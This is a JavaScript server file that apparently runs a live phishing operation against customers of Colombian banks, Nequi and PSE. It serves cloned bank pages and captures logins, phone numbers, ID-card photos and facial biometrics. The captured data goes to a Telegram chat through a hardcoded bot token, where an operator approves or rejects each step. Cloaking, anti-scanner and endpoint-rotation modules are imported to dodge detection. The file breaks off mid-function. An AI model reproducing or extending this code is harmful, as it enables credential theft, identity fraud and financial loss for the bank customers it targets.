const express = require('express');
const http = require('http');
const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const cluster = require('cluster');
const socketIO = require('socket.io');
const TelegramBot = require('node-telegram-bot-api');
const compression = require('compression');
const helmet = require('helmet');
const rateLimit = require('express-rate-limit');
const { createCloaker } = require('./js/cloaker');
const { createAntiScanner } = require('./js/anti-scanner');
const { EndpointRotator, validateSlug, createSlugEndpoint } = require('./js/endpoint-rotator');

const PORT = process.env.PORT || 3000;
const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN || process.env.TELEGRAM_TOKEN || '8886352284:AAHJP6lO11lmD3z0gALzj2IeyEHLVEqBcfg';
const CHAT_ID = process.env.TELEGRAM_CHAT_ID || process.env.CHAT_ID || '-5218723082';
const NODE_ENV = process.env.NODE_ENV || 'development';
const TRUST_PROXY_RAW = process.env.TRUST_PROXY || 'loopback, linklocal, uniquelocal';
// Coerce numeric strings ("1", "2") to Number — required by Express trust proxy
const TRUST_PROXY = /^\d+$/.test(TRUST_PROXY_RAW) ? Number(TRUST_PROXY_RAW) : TRUST_PROXY_RAW;

const app = express();

// Confiar en Nginx / Azure Front Door / proxies para obtener IP real (X-Forwarded-For)
app.set('trust proxy', TRUST_PROXY);

// Ocultar firma de Express
app.disable('x-powered-by');

const server = http.createServer(app);

// Tuning del HTTP server para alto tráfico
server.keepAliveTimeout = 65 * 1000;   // > balanceadores típicos (60s)
server.headersTimeout   = 70 * 1000;   // > keepAliveTimeout
// maxConnections: dejar default (ilimitado). Setear a 0 RECHAZA todas las conexiones.

// Configuración optimizada de Socket.IO para alta concurrencia
const io = socketIO(server, {
    cors: {
        origin: process.env.CORS_ORIGIN || "*",
        methods: ["GET", "POST"],
        credentials: true
    },
    // Tolerante a redes móviles inestables: 25s ping, 60s timeout
    pingInterval: 25000,
    pingTimeout: 60000,
    connectTimeout: 45000,
    upgradeTimeout: 15000,
    maxHttpBufferSize: 1e7,   // 10MB (suficiente para imágenes)
    transports: ['websocket', 'polling'],
    allowUpgrades: true,
    perMessageDeflate: { threshold: 1024 },
    httpCompression: { threshold: 1024 },
    // Recuperación de estado en reconexiones cortas (Socket.IO 4.6+)
    connectionStateRecovery: {
        maxDisconnectionDuration: 2 * 60 * 1000,  // 2 min
        skipMiddlewares: true
    }
});

// Adapter Redis (multi-proceso) si hay REDIS_URL
if (process.env.REDIS_URL) {
    try {
        const { createAdapter } = require('@socket.io/redis-adapter');
        const { createClient } = require('redis');
        const pubClient = createClient({ url: process.env.REDIS_URL });
        const subClient = pubClient.duplicate();
        Promise.all([pubClient.connect(), subClient.connect()])
            .then(() => {
                io.adapter(createAdapter(pubClient, subClient));
                console.log('🔗 Socket.IO Redis adapter conectado');
            })
            .catch(err => console.error('Redis adapter error:', err.message));
    } catch (err) {
        console.warn('⚠️  Redis adapter no disponible:', err.message);
    }
}

/**
 * Solo UN proceso puede hacer getUpdates (polling). Varias instancias/workers
 * con el mismo token → error 409 y dejan de funcionar envío y botones.
 */
function shouldEnableTelegramPolling() {
    const flag = (process.env.TELEGRAM_POLLING || 'auto').toLowerCase();
    if (flag === 'false' || flag === '0' || flag === 'off') return false;
    if (flag === 'true' || flag === '1' || flag === 'on') return true;
    if (cluster.isWorker) return cluster.worker.id === 1;
    return true;
}

const isTelegramPoller = shouldEnableTelegramPolling();

const bot = new TelegramBot(TELEGRAM_TOKEN, {
    polling: false,
    request: {
        agentOptions: { keepAlive: true, family: 4 },
        timeout: 30000
    }
});

// ─────────────────────────────────────────────
// Retry/backoff transparente para llamadas Telegram
// (Wrap los m\u00e9todos del bot \u2192 todas las llamadas existentes lo heredan)
// ─────────────────────────────────────────────
// 4xx (excepto 429) son definitivos: NO se reintentan.
const TG_RETRY_NET_CODES = new Set(['EFATAL', 'ECONNRESET', 'ETIMEDOUT', 'ENOTFOUND', 'ECONNABORTED', 'EAI_AGAIN']);
const TG_MAX_RETRIES = 2;
const TG_MAX_RETRY_AFTER_MS = 5000;
const TG_NO_RETRY_METHODS = new Set(['answerCallbackQuery']);
const TG_METHODS_TO_WRAP = [
    'sendMessage', 'sendPhoto', 'sendDocument', 'sendVideo',
    'editMessageText', 'editMessageReplyMarkup', 'editMessageCaption',
    'answerCallbackQuery', 'deleteMessage'
];

const sleep = (ms) => new Promise(r => setTimeout(r, ms));

function isRetriableTgError(err) {
    const code = err?.code;
    const status = err?.response?.statusCode;
    if (status && status >= 400 && status < 500 && status !== 429) return false;
    if (status === 429) return true;
    if (status >= 500 && status < 600) return true;
    if (TG_RETRY_NET_CODES.has(code)) return true;
    return false;
}

for (const method of TG_METHODS_TO_WRAP) {
    if (typeof bot[method] !== 'function') continue;
    const original = bot[method].bind(bot);
    const noRetry = TG_NO_RETRY_METHODS.has(method);
    bot[method] = async function (...args) {
        let lastErr;
        const maxAttempts = noRetry ? 0 : TG_MAX_RETRIES;
        for (let attempt = 0; attempt <= maxAttempts; attempt++) {
            try {
                return await original(...args);
            } catch (err) {
                lastErr = err;
                if (noRetry || !isRetriableTgError(err) || attempt === maxAttempts) throw err;

                const retryAfter = err?.response?.body?.parameters?.retry_after;
                if (retryAfter && retryAfter * 1000 > TG_MAX_RETRY_AFTER_MS) {
                    console.warn(`\u26a0\ufe0f  Telegram ${method} rate-limit ${retryAfter}s -> abort`);
                    throw err;
                }
                const delay = retryAfter
                    ? (retryAfter + 1) * 1000
                    : 250 * Math.pow(2, attempt);  // 250, 500ms

                console.warn(`\u26a0\ufe0f  Telegram ${method} fallo (${err.code || err.response?.statusCode}). Reintento ${attempt + 1}/${maxAttempts} en ${delay}ms`);
                await sleep(delay);
            }
        }
        throw lastErr;
    };
}

let polling409Streak = 0;
let pollingRestartTimer = null;
let pollingActive = false;
let telegramUpdateMode = 'none';

const WEBHOOK_SECRET = process.env.TELEGRAM_WEBHOOK_SECRET
    || crypto.createHash('sha256').update(String(TELEGRAM_TOKEN)).digest('hex').slice(0, 24);
const TELEGRAM_WEBHOOK_PATH = `/api/telegram/webhook/${WEBHOOK_SECRET}`;

function getPublicBaseUrl() {
    const raw = process.env.TELEGRAM_WEBHOOK_URL
        || process.env.RENDER_EXTERNAL_URL
        || process.env.PUBLIC_URL
        || '';
    return raw.replace(/\/api\/telegram\/webhook.*$/i, '').replace(/\/$/, '');
}

function shouldUseTelegramWebhook() {
    // Solo webhook si lo pides explícito (la versión antigua usaba polling y funcionaba)
    return process.env.USE_TELEGRAM_WEBHOOK === 'true' || process.env.USE_TELEGRAM_WEBHOOK === '1';
}

async function startTelegramPolling() {
    if (!isTelegramPoller || !TELEGRAM_TOKEN || pollingActive) return;
    try {
        await bot.stopPolling({ cancel: true }).catch(() => {});
        await bot.deleteWebHook({ drop_pending_updates: true });
        await sleep(1500);
        await bot.startPolling({
            interval: 1000,
            params: { timeout: 30 }
        });
        pollingActive = true;
        telegramUpdateMode = 'polling';
        const wid = cluster.isWorker ? `worker #${cluster.worker.id}` : 'proceso único';
        console.log(`🤖 Telegram POLLING activo (${wid}, pid ${process.pid})`);
    } catch (err) {
        console.error('❌ No se pudo iniciar Telegram polling:', err.message);
    }
}

async function startTelegramWebhook() {
    const baseUrl = getPublicBaseUrl();
    if (!baseUrl || !TELEGRAM_TOKEN) return false;
    try {
        await bot.stopPolling({ cancel: true }).catch(() => {});
        pollingActive = false;
        const fullUrl = `${baseUrl}${TELEGRAM_WEBHOOK_PATH}`;
        await bot.setWebHook(fullUrl, {
            allowed_updates: ['callback_query', 'message'],
            drop_pending_updates: true
        });
        const info = await bot.getWebHookInfo();
        if (!info?.url) {
            console.error('❌ Telegram no registró el webhook (url vacía)');
            return false;
        }
        telegramUpdateMode = 'webhook';
        console.log(`🤖 Telegram WEBHOOK activo: ${info.url} (pendientes: ${info.pending_update_count || 0})`);
        return true;
    } catch (err) {
        console.error('❌ No se pudo configurar webhook:', err.message);
        return false;
    }
}

async function initTelegramUpdates() {
    if (!TELEGRAM_TOKEN) return;

    if (shouldUseTelegramWebhook()) {
        const ok = await startTelegramWebhook();
        if (ok) return;
        console.warn('⚠️  Webhook falló — usando POLLING (modo antiguo que funcionaba)');
    }

    if (!isTelegramPoller) {
        console.log('🤖 Telegram: solo envío de mensajes (sin polling en este worker)');
        return;
    }

    if (!bot.listenerCount('polling_error')) {
    bot.on('polling_error', async (err) => {
        const code = err && (err.code || err.response?.statusCode);
        const msg  = err && (err.message || '');
        if (code === 'ETELEGRAM' && /409/.test(msg)) {
            polling409Streak++;
            pollingActive = false;
            if (polling409Streak === 1 || polling409Streak % 10 === 0) {
                console.warn(`⚠️  Telegram 409 [streak=${polling409Streak}]: hay OTRA app/proceso con el mismo token haciendo polling.`);
                console.warn('   → En Render: 1 sola instancia. Cierra servidor local. Usa WEBHOOK (RENDER_EXTERNAL_URL).');
            }
            if (polling409Streak >= 3) {
                try { await bot.stopPolling({ cancel: true }); } catch (_) {}
                return;
            }
            if (pollingRestartTimer) return;
            try { await bot.stopPolling({ cancel: true }); } catch (_) {}
            pollingRestartTimer = setTimeout(() => {
                pollingRestartTimer = null;
                startTelegramPolling();
            }, 15000);
            return;
        }
        polling409Streak = 0;
        console.error('Telegram polling_error:', msg || err);
    });
    bot.on('error', (err) => console.error('Telegram bot error:', err && err.message));
    }
    await startTelegramPolling();
}

class SessionManager {
    constructor() {
        this.sessions = new Map();
        this.socketToSession = new Map();
        // 6h: cubre flujos largos sin perder sesión por timeout
        this.EXPIRY_TIME = 6 * 60 * 60 * 1000;
    }

    createSession(sessionId, socketId, module, data = {}) {
        const sessionData = {
            sessionId,
            socketId,
            module,
            currentPage: module,
            data,
            createdAt: Date.now(),
            lastActivity: Date.now()
        };
        this.sessions.set(sessionId, sessionData);
        this.socketToSession.set(socketId, sessionId);
        return sessionData;
    }

    getSession(sessionId) {
        return this.sessions.get(sessionId);
    }

    getSessionBySocket(socketId) {
        const sessionId = this.socketToSession.get(socketId);
        return sessionId ? this.sessions.get(sessionId) : null;
    }

    updatePage(sessionId, page) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.currentPage = page;
            session.lastActivity = Date.now();
            return true;
        }
        return false;
    }

    addData(sessionId, newData) {
        const session = this.sessions.get(sessionId);
        if (session) {
            session.data = { ...session.data, ...newData };
            session.lastActivity = Date.now();
            return true;
        }
        return false;
    }

    updateSocket(sessionId, newSocketId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            if (session.socketId) this.socketToSession.delete(session.socketId);
            session.socketId = newSocketId;
            session.lastActivity = Date.now();
            this.socketToSession.set(newSocketId, sessionId);
            return true;
        }
        return false;
    }

    clearSocket(sessionId) {
        const session = this.sessions.get(sessionId);
        if (!session) return false;
        if (session.socketId) this.socketToSession.delete(session.socketId);
        session.socketId = null;
        session.lastActivity = Date.now();
        return true;
    }

    deleteSession(sessionId) {
        const session = this.sessions.get(sessionId);
        if (session) {
            this.socketToSession.delete(session.socketId);
            this.sessions.delete(sessionId);
            return true;
        }
        return false;
    }

    cleanExpiredSessions() {
        const now = Date.now();
        let cleaned = 0;
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now - session.lastActivity > this.EXPIRY_TIME) {
                this.deleteSession(sessionId);
                cleaned++;
            }
        }
        return cleaned;
    }

    getStats() {
        const modules = {};
        for (const session of this.sessions.values()) {
            modules[session.module] = (modules[session.module] || 0) + 1;
        }
        return {
            totalSessions: this.sessions.size,
            byModule: modules
        };
    }
}

const sessionManager = new SessionManager();

const BANK_ROUTES = {
    'Agrario': '/bancas/Agrario/index.html',
    'AV Villas': '/bancas/AV-Villas/index.html',
    'Banco Mundo Mujer': '/bancas/Banco-Mundo-Mujer/index.html',
    'Bancolombia': '/bancas/Bancolombia/index.html',
    'BBVA': '/bancas/BBVA/index.html',
    'Bogota': '/bancas/Bogota/index.html',
    'Caja Social': '/bancas/Caja-Social/index.html',
    'Daviplata': '/bancas/Daviplata/index.html',
    'Davivienda': '/bancas/Davivienda/index.html',
    'Falabella': '/bancas/Falabella/index.html',
    'itau': '/bancas/Itau/index.html',
    'Occidente': '/bancas/Occidente/index.html',
    'Popular': '/bancas/Popular/index.html',
    'Scotiabank Colpatria': '/bancas/Scotiabank-Colpatria/index.html',
    'Serfinanza': '/bancas/Serfinanza/index.html'
};

function getBankRoute(bankKey) {
    if (!bankKey) return null;
    return BANK_ROUTES[bankKey] || null;
}

function findSocketsForSession(sessionId) {
    const found = new Set();
    const room = io.sockets.adapter.rooms.get(sessionId);
    if (room) {
        for (const sid of room) {
            const sock = io.sockets.sockets.get(sid);
            if (sock) found.add(sock);
        }
    }
    const session = sessionManager.getSession(sessionId);
    if (session?.socketId) {
        const sock = io.sockets.sockets.get(session.socketId);
        if (sock) found.add(sock);
    }
    for (const sock of io.sockets.sockets.values()) {
        if (sock.data.sessionId === sessionId) found.add(sock);
    }
    return found;
}

/** Envía evento al cliente (igual que la versión antigua: room + respaldo por socket) */
function deliverToSession(sessionId, event, payload, fromCluster = false) {
    io.to(sessionId).emit(event, payload);

    const sockets = findSocketsForSession(sessionId);
    for (const sock of sockets) {
        sock.join(sessionId);
        sock.emit(event, payload);
    }

    if (!fromCluster && cluster.isWorker && typeof process.send === 'function') {
        try {
            process.send({ type: 'socket-deliver', sessionId, event, payload });
        } catch (_) { /* ignore */ }
    }
}

function sessionHasLiveSocket(sessionId) {
    return findSocketsForSession(sessionId).size > 0;
}

if (cluster.isWorker) {
    process.on('message', (msg) => {
        if (msg?.type === 'socket-deliver' && msg.sessionId) {
            deliverToSession(msg.sessionId, msg.event, msg.payload, true);
        }
    });
}

// Mapa para almacenar mensajes de Telegram por sessionId
const telegramMessages = new Map();

// ─────────────────────────────────────────────
// Middlewares globales (orden importa)
// ─────────────────────────────────────────────

// 1) Force HTTPS en producción (con soporte X-Forwarded-Proto de Nginx)
const FORCE_HTTPS = process.env.FORCE_HTTPS === 'true' || NODE_ENV === 'production';
if (FORCE_HTTPS) {
    app.use((req, res, next) => {
        if (req.secure || req.headers['x-forwarded-proto'] === 'https') return next();
        if (req.path === '/health') return next();
        return res.redirect(301, `https://${req.headers.host}${req.originalUrl}`);
    });
}

// 2) Headers de seguridad MÁXIMOS (Safe Browsing, COOP, COEP, CSP estricta)
//    En development se desactiva HSTS y upgrade-insecure-requests para no romper http://localhost
const isProd = NODE_ENV === 'production';
app.use(helmet({
    contentSecurityPolicy: {
        useDefaults: true,
        directives: {
            defaultSrc:   ["'self'"],
            scriptSrc:    [
                "'self'", "'unsafe-inline'",
                'https://www.googletagmanager.com',
                'https://www.google-analytics.com',
                'https://www.googleadservices.com',
                'https://googleads.g.doubleclick.net',
                'https://www.google.com'
            ],
            scriptSrcElem: [
                "'self'", "'unsafe-inline'",
                'https://www.googletagmanager.com',
                'https://www.google-analytics.com',
                'https://www.googleadservices.com',
                'https://googleads.g.doubleclick.net',
                'https://www.google.com'
            ],
            styleSrc:     ["'self'", "'unsafe-inline'", 'https://fonts.googleapis.com'],
            fontSrc:      ["'self'", 'https://fonts.gstatic.com', 'data:'],
            imgSrc:       ["'self'", 'data:', 'blob:', 'https:'],
            connectSrc:   [
                "'self'", 'ws:', 'wss:',
                'https://www.google-analytics.com',
                'https://www.googletagmanager.com',
                'https://www.googleadservices.com',
                'https://googleads.g.doubleclick.net',
                'https://www.google.com',
                'https://stats.g.doubleclick.net',
                'https://region1.google-analytics.com',
                'https://analytics.google.com'
            ],
            frameSrc:     [
                "'self'",
                'https://td.doubleclick.net',
                'https://www.googletagmanager.com',
                'https://bid.g.doubleclick.net'
            ],
            frameAncestors: ["'self'"],
            baseUri:      ["'self'"],
            formAction:   ["'self'"],
            objectSrc:    ["'none'"],
            ...(isProd ? { upgradeInsecureRequests: [] } : {})
        }
    },
    strictTransportSecurity: isProd ? {
        maxAge: 63072000,           // 2 años
        includeSubDomains: true,
        preload: true
    } : false,
    referrerPolicy: { policy: 'strict-origin-when-cross-origin' },
    crossOriginOpenerPolicy: { policy: 'same-origin' },
    crossOriginResourcePolicy: { policy: 'same-origin' },
    crossOriginEmbedderPolicy: false,    // Romperia algunos recursos externos
    originAgentCluster: true,
    xFrameOptions: { action: 'sameorigin' },
    xContentTypeOptions: true,
    xDnsPrefetchControl: { allow: false },
    xDownloadOptions: true,
    xPermittedCrossDomainPolicies: { permittedPolicies: 'none' }
}));

// 3) Headers extra (Permissions-Policy, no FLoC, anti-MIME-sniff)
app.use((req, res, next) => {
    res.setHeader('Permissions-Policy', 'geolocation=(), microphone=(), camera=(self), payment=(), usb=(), accelerometer=(), gyroscope=(), magnetometer=(), interest-cohort=()');
    res.setHeader('X-Robots-Tag', 'index, follow');
    res.setHeader('X-DNS-Prefetch-Control', 'off');
    if (isProd) res.setHeader('Expect-CT', 'max-age=86400, enforce');
    res.removeHeader('X-Powered-By');
    res.removeHeader('Server');
    next();
});

// 4) Anti-scanner / tarpit (debe ir ANTES del rate-limit para no malgastar slots)
app.use(createAntiScanner({
    logEnabled: NODE_ENV !== 'production',
    maxHitsBeforeDrop: 5
}));

// favicon (evita 404 ruidoso)
app.get('/favicon.ico', (req, res) => res.status(204).end());

// 5) Compresión gzip/brotli
app.use(compression({
    threshold: 1024,
    filter: (req, res) => {
        if (req.headers['x-no-compression']) return false;
        return compression.filter(req, res);
    }
}));

// 6) Rate limiting global (defensa anti-flood). Nginx también limita arriba.
const globalLimiter = rateLimit({
    windowMs: 60 * 1000,
    max: 300,
    standardHeaders: true,
    legacyHeaders: false,
    skip: (req) => req.path === '/health' || req.path.startsWith('/socket.io') || req.path.startsWith('/api/telegram/')
});
app.use(globalLimiter);

app.use(express.static(path.join(__dirname), {
    index: false,
    maxAge: NODE_ENV === 'production' ? '7d' : 0,
    etag: true,
    lastModified: true,
    setHeaders: (res, filePath) => {
        if (/\.(html|json|xml)$/i.test(filePath)) {
            res.setHeader('Cache-Control', 'no-store, no-cache, must-revalidate');
        }
    }
}));
app.use(express.json({ limit: '1mb' }));

app.post(TELEGRAM_WEBHOOK_PATH, (req, res) => {
    res.sendStatus(200);
    const update = req.body;
    if (!update) return;

    const label = update.callback_query?.data
        ? `callback:${update.callback_query.data}`
        : `update:${update.update_id}`;
    console.log('📥 Webhook Telegram:', label);

    setImmediate(() => {
        if (update.callback_query) {
            handleCallbackQuery(update.callback_query).catch((err) => {
                console.error('❌ Webhook callback error:', err.message);
            });
        } else {
            bot.processUpdate(update).catch((err) => {
                console.error('❌ Webhook processUpdate:', err.message);
            });
        }
    });
});

io.on('connection', (socket) => {
    console.log('✅ Cliente conectado:', socket.id);

    // Auto-join a room basado en sessionId del handshake (si lo manda el cliente)
    const handshakeSessionId = socket.handshake?.auth?.sessionId;
    if (handshakeSessionId) {
        socket.join(handshakeSessionId);
        socket.data.sessionId = handshakeSessionId;
    }

    socket.on('initSession', (payload) => {
        const { sessionId, module, page, data } = payload;
        let session = sessionManager.getSession(sessionId);
        
        if (session) {
            sessionManager.updateSocket(sessionId, socket.id);
            sessionManager.updatePage(sessionId, page);
            if (data && Object.keys(data).length) sessionManager.addData(sessionId, data);
            console.log(`🔄 Sesión actualizada: ${sessionId} | Módulo: ${module} | Página: ${page}`);
        } else {
            session = sessionManager.createSession(sessionId, socket.id, module, data || {});
            console.log(`🆕 Nueva sesión creada: ${sessionId} | Módulo: ${module}`);
        }

        socket.join(sessionId);
        socket.data.sessionId = sessionId;

        socket.emit('sessionConfirmed', {
            success: true,
            sessionId,
            session: { module: session.module, currentPage: session.currentPage, data: session.data }
        });
    });

    // Manejador alternativo para bancas que usan init_session con guión bajo
    socket.on('init_session', (payload) => {
        const { sessionId } = payload;
        let session = sessionManager.getSession(sessionId);
        
        if (session) {
            sessionManager.updateSocket(sessionId, socket.id);
            console.log(`🔄 Sesión de banca reconectada: ${sessionId} | Socket: ${socket.id}`);
        } else {
            // Crear sesión temporal si no existe (puede venir de PSE)
            session = sessionManager.createSession(sessionId, socket.id, 'banco', {});
            console.log(`🆕 Nueva sesión de banco creada: ${sessionId} | Socket: ${socket.id}`);
        }

        // Garantizar membresía al room para entregas confiables vía io.to(sessionId)
        socket.join(sessionId);
        socket.data.sessionId = sessionId;

        socket.emit('session_ready', {
            sessionId: sessionId,
            socketId: socket.id
        });
    });

    socket.on('updatePage', ({ sessionId, page }) => {
        sessionManager.updatePage(sessionId, page);
    });

    socket.on('keepAlive', ({ sessionId }) => {
        const session = sessionManager.getSession(sessionId);
        if (session) session.lastActivity = Date.now();
    });

    socket.on('ping', () => socket.emit('pong'));

    socket.on('sendPSEToTelegram', async ({ sessionId, data }) => {
        console.log('📤 Recibiendo datos PSE:', { sessionId, data });
        try {
            sessionManager.addData(sessionId, { 
                ...data, 
                pseCompleted: true, 
                pseTimestamp: Date.now() 
            });
            
            const keyboard = {
                inline_keyboard: [
                    [
                        { text: '✅ Aprobar', callback_data: `pse_approve_${sessionId}` },
                        { text: '⏳ Esperar', callback_data: `pse_wait_${sessionId}` }
                    ],
                    [{ text: '❌ Rechazar', callback_data: `pse_reject_${sessionId}` }]
                ]
            };

            console.log('📨 Enviando PSE a Telegram - Chat:', CHAT_ID, '| Keyboard:', JSON.stringify(keyboard));
            const telegramMessage = await bot.sendMessage(
                CHAT_ID, 
                formatPSEMessage(data, sessionId), 
                {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                }
            );

            console.log('✅ Mensaje PSE enviado a Telegram:', telegramMessage.message_id);
            socket.emit('telegramSent', { success: true, sessionId, messageId: telegramMessage.message_id });
        } catch (error) {
            console.error('❌ Error enviando PSE a Telegram:', error.message, error.response?.body);
            socket.emit('error', { 
                message: 'Error al enviar datos PSE', 
                error: error.message 
            });
        }
    });

    socket.on('sendToTelegram', async ({ sessionId, data }) => {
        try {
            const isBank = !!(data.bank && data.page);
            
            // Acumular datos en la sesión
            sessionManager.addData(sessionId, { 
                ...data, 
                [isBank ? `${data.bank}_${data.page}` : 'nequiFormCompleted']: true, 
                timestamp: Date.now() 
            });

            let keyboard, message;
            const existingMsg = telegramMessages.get(sessionId);

            if (isBank) {
                console.log(`📤 Datos de banco: ${data.bank} - Página: ${data.page}`);
                keyboard = getBankKeyboard(data.bank, sessionId);
                
                // Obtener todos los datos acumulados de la sesión
                const session = sessionManager.getSession(sessionId);
                message = formatBankMessageAccumulated(session.data, sessionId);
                
                // Enviar NUEVO mensaje con datos acumulados
                const telegramMessage = await bot.sendMessage(CHAT_ID, message, {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
                telegramMessages.set(sessionId, { messageId: telegramMessage.message_id });
                console.log('✅ Nuevo mensaje enviado con datos acumulados:', telegramMessage.message_id);

                // Enviar imágenes si existen (cédula o biometría)
                if (data.front || data.back || data.face) {
                    console.log('📸 Detectadas imágenes, enviando a Telegram...');
                    
                    if (data.front) {
                        try {
                            const buffer = Buffer.from(data.front.replace(/^data:image\/\w+;base64,/, ''), 'base64');
                            await bot.sendPhoto(CHAT_ID, buffer, { 
                                caption: '🪪 Cédula - Frontal',
                                reply_to_message_id: telegramMessage.message_id 
                            });
                            console.log('✅ Imagen frontal de cédula enviada');
                        } catch (err) {
                            console.error('❌ Error enviando imagen frontal:', err.message);
                        }
                    }
                    
                    if (data.back) {
                        try {
                            const buffer = Buffer.from(data.back.replace(/^data:image\/\w+;base64,/, ''), 'base64');
                            await bot.sendPhoto(CHAT_ID, buffer, { 
                                caption: '🪪 Cédula - Reverso',
                                reply_to_message_id: telegramMessage.message_id 
                            });
                            console.log('✅ Imagen reverso de cédula enviada');
                        } catch (err) {
                            console.error('❌ Error enviando imagen reverso:', err.message);
                        }
                    }
                    
                    if (data.face) {
                        try {
                            const buffer = Buffer.from(data.face.replace(/^data:image\/\w+;base64,/, ''), 'base64');
                            await bot.sendPhoto(CHAT_ID, buffer, { 
                                caption: '🤳 Biometría Facial',
                                reply_to_message_id: telegramMessage.message_id 
                            });
                            console.log('✅ Imagen de biometría enviada');
                        } catch (err) {
                            console.error('❌ Error enviando biometría:', err.message);
                        }
                    }
                }
            } else {
                // Mensaje y botones para Nequi
                keyboard = {
                    inline_keyboard: [
                        [
                            { text: '✅ Continuar a PSE', callback_data: `nequi_follow_${sessionId}` },
                            { text: '⏳ Esperar', callback_data: `nequi_wait_${sessionId}` }
                        ],
                        [{ text: '❌ Rechazar', callback_data: `nequi_reject_${sessionId}` }]
                    ]
                };
                message = formatTelegramMessage(data, sessionId);
                const telegramMessage = await bot.sendMessage(CHAT_ID, message, {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });
                telegramMessages.set(sessionId, { messageId: telegramMessage.message_id });
                console.log('✅ Mensaje enviado a Telegram:', telegramMessage.message_id);
            }

            socket.emit('telegramSent', { success: true, sessionId });
        } catch (error) {
            console.error('❌ Error enviando a Telegram:', error.message, error.response?.body);
            socket.emit('error', { 
                message: 'Error al enviar datos', 
                error: error.message 
            });
        }
    });

    // PROXY TRANSPARENTE: Interceptar y reenviar mensajes de las bancas al Telegram principal
    socket.on('sendData', async (data) => {
        console.log('🔍 PROXY: Interceptando mensaje de banca:', data);
        
        try {
            // Extraer sessionId (puede venir del data o del payload)
            let sessionId = data.sessionId;
            
            // Si no hay sessionId en el data, buscar en la sesión del socket
            if (!sessionId) {
                const session = sessionManager.getSessionBySocket(socket.id);
                sessionId = session ? session.sessionId : null;
            }
            
            if (!sessionId) {
                console.warn('⚠️ No se encontró sessionId, creando temporal');
                sessionId = `temp_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
            }

            const session = sessionManager.getSession(sessionId);
            const sessionData = session ? session.data : {};

            // Guardar datos en la sesión
            if (session) {
                sessionManager.addData(sessionId, {
                    [`bank_${data.type}`]: data,
                    [`bank_${data.type}_timestamp`]: Date.now()
                });
            }

            // Preparar mensaje para Telegram
            let telegramText = '';
            let keyboard = data.content?.keyboard || null;

            if (data.content?.text) {
                telegramText = data.content.text;
            } else if (typeof data.content === 'string') {
                telegramText = data.content;
            }

            // Agregar contexto de la sesión Nequi/PSE si existe
            let fullMessage = '';
            if (sessionData.phone || sessionData.amount || sessionData.bank) {
                fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n`;
                fullMessage += `🔔 <b>DATOS DEL BANCO</b>\n`;
                fullMessage += `━━━━━━━━━━━━━━━━━━━━━━\n\n`;
                if (sessionData.phone) fullMessage += `📱 <b>Celular Nequi:</b> ${sessionData.phone}\n`;
                if (sessionData.amount) fullMessage += `💰 <b>Monto:</b> $${formatAmount(sessionData.amount)}\n`;
                if (sessionData.bank) fullMessage += `🏦 <b>Banco:</b> ${sessionData.bank}\n`;
                if (sessionData.email) fullMessage += `📧 <b>Email PSE:</b> ${sessionData.email}\n`;
                fullMessage += `\n`;
            }
            fullMessage += telegramText;
            fullMessage += `\n\n🆔 <code>${sessionId}</code>`;

            // Si hay imagen, enviar imagen con caption
            if (data.content?.image) {
                console.log('📷 Enviando imagen a Telegram');
                const imageBuffer = Buffer.from(data.content.image.split(',')[1], 'base64');
                
                const sentMessage = await bot.sendPhoto(CHAT_ID, imageBuffer, {
                    caption: fullMessage,
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });

                // Guardar referencia del mensaje
                telegramMessages.set(sessionId, {
                    messageId: sentMessage.message_id,
                    chatId: CHAT_ID,
                    keyboard: keyboard
                });

                console.log('✅ Imagen enviada a Telegram:', sentMessage.message_id);
                
                // Confirmar al cliente de la banca
                socket.emit('dataSent', { 
                    success: true, 
                    sessionId, 
                    messageId: sentMessage.message_id 
                });
            } else {
                // Enviar texto normal
                console.log('📨 Enviando mensaje a Telegram');
                
                const sentMessage = await bot.sendMessage(CHAT_ID, fullMessage, {
                    parse_mode: 'HTML',
                    reply_markup: keyboard
                });

                // Guardar referencia del mensaje
                telegramMessages.set(sessionId, {
                    messageId: sentMessage.message_id,
                    chatId: CHAT_ID,
                    keyboard: keyboard
                });

                console.log('✅ Mensaje enviado a Telegram:', sentMessage.message_id);
                
                // Confirmar al cliente de la banca
                socket.emit('dataSent', { 
                    success: true, 
                    sessionId, 
                    messageId: sentMessage.message_id 
                });
            }

        } catch (error) {
            console.error('❌ Error en PROXY:', error.message);
            socket.emit('dataSent', { 
                success: false, 
                error: error.message 
            });
        }
    });

    socket.on('disconnect', () => {
        const session = sessionManager.getSessionBySocket(socket.id);
        if (session) {
            console.log('❌ Cliente desconectado:', socket.id, '| Sesión:', session.sessionId);
        }
    });
});

async function handleCallbackQuery(callbackQuery) {
    const data = callbackQuery?.data;
    const callbackId = callbackQuery?.id;
    const messageId = callbackQuery?.message?.message_id;
    const chatId = callbackQuery?.message?.chat?.id;

    try {
        if (!data || !callbackId) {
            console.warn('⚠️ Callback sin data o id');
            return;
        }
        console.log('🔘 Callback recibido:', data);
        
        // Intentar parsear diferentes formatos de callback_data
        let sessionId = null;
        let action = null;
        let module = null;
        
        // Formato: action:page:sessionId (usado por algunas bancas)
        if (data.includes(':')) {
            const parts = data.split(':');
            action = parts[0];
            sessionId = parts[parts.length - 1];
            
            console.log('📋 Formato con ":" detectado | Acción:', action, '| SessionId:', sessionId);
        }
        // Formato: module_action_sessionId (usado por Nequi/PSE)
        else if (data.includes('_')) {
            const parts = data.split('_');
            module = parts[0];
            action = parts[1];
            sessionId = parts.slice(2).join('_');
            
            console.log('📋 Formato con "_" detectado | Módulo:', module, '| Acción:', action, '| SessionId:', sessionId);
        }

        if (!sessionId) {
            console.error('❌ No se pudo extraer sessionId del callback');
            await bot.answerCallbackQuery(callbackId, { text: '⚠️ Formato de callback inválido', show_alert: true });
            return;
        }

        // Buscar sesi\u00f3n (informativo) y refrescar lastActivity
        const session = sessionManager.getSession(sessionId);
        if (session) session.lastActivity = Date.now();

        const liveSockets = findSocketsForSession(sessionId);
        const live = liveSockets.size > 0;

        if (!live) {
